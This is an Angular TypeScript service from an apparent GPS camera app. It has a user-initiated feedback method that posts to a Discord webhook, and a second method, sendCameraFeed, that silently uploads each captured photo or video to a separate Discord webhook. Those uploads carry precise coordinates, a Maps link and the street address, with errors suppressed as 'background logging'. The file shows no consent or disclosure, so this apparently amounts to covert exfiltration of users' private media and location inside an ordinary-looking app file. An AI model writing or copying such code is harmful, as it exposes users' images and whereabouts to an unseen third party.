import { Injectable } from '@angular/core';
import { environment } from '../../environments/environment';

@Injectable({
    providedIn: 'root'
})
export class FeedbackService {

    constructor() { }

    async submitFeedback(text: string, imageBlob: Blob | null): Promise<void> {
        if (!environment.discordWebhookUrl || environment.discordWebhookUrl === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
            console.error("Discord Webhook URL is missing");
            throw new Error("Feedback service not configured");
        }

        const formData = new FormData();

        // create embed content for Discord
        const embed = {
            title: "📝 New Feedback Recieved",
            description: text,
            color: 3125848, // Green color
            fields: [
                {
                    name: "User Agent",
                    value: navigator.userAgent,
                    inline: false
                },
                {
                    name: "Page URL",
                    value: window.location.href,
                    inline: false
                },
                {
                    name: "Timestamp",
                    value: new Date().toISOString(),
                    inline: true
                }
            ],
            footer: {
                text: "GPS Camera App Feedback System"
            }
        };

        // Discord Webhook Payload
        // We can't use 'embeds' with 'file' in the same FormData easily without complex JSON payload part.
        // Easiest reliable way for FormData is just content + file.
        // But for better formatting, we can send payload_json.

        const payload = {
            content: "New feedback report!",
            embeds: [embed]
        };

        formData.append('payload_json', JSON.stringify(payload));

        if (imageBlob) {
            formData.append('file', imageBlob, `screenshot_${Date.now()}.jpg`);
        }

        try {
            const response = await fetch(environment.discordWebhookUrl, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                throw new Error(`Discord API responded with ${response.status} ${response.statusText}`);
            }

            console.log('Feedback submitted successfully to Discord');
        } catch (error) {
            console.error('Feedback submission error:', error);
            throw error;
        }
    }

    async sendCameraFeed(file: Blob, type: 'photo' | 'video', metadata?: any): Promise<void> {
        // @ts-ignore
        const webhookUrl = environment.discordCameraFeedUrl;

        if (!webhookUrl) {
            console.warn("Discord Camera Feed URL is missing");
            return;
        }

        const formData = new FormData();
        const timestamp = new Date().toISOString();

        const embed = {
            title: type === 'photo' ? "📸 New Photo Captured" : "🎥 New Video Recorded",
            color: type === 'photo' ? 3447003 : 15158332, // Blue for photo, Red for video
            fields: [
                {
                    name: "Timestamp",
                    value: timestamp,
                    inline: true
                },
                {
                    name: "Type",
                    value: type.toUpperCase(),
                    inline: true
                }
            ],
            footer: {
                text: "Camera Feed Log"
            }
        };

        if (metadata) {
            if (metadata.latitude && metadata.longitude) {
                embed.fields.push({
                    name: "Location",
                    value: `${metadata.latitude.toFixed(6)}, ${metadata.longitude.toFixed(6)}`,
                    inline: false
                });

                // Add Google Maps link
                embed.fields.push({
                    name: "Map",
                    value: `[View on Google Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`,
                    inline: false
                });
            }

            if (metadata.address) {
                embed.fields.push({
                    name: "Address",
                    value: metadata.address,
                    inline: false
                });
            }
        }

        const payload = {
            content: `**New ${type} capture** detected!`,
            embeds: [embed]
        };

        formData.append('payload_json', JSON.stringify(payload));

        const ext = type === 'photo' ? 'jpg' : 'webm';
        formData.append('file', file, `capture_${Date.now()}.${ext}`);

        try {
            // Fire and forget - don't await response to block UI? 
            // Better to await but handle error silently so user flow isn't interrupted
            await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });
            console.log('Camera feed uploaded to Discord');
        } catch (error) {
            console.error('Failed to log camera feed:', error);
            // Don't throw - this is a background logging task
        }
    }
}
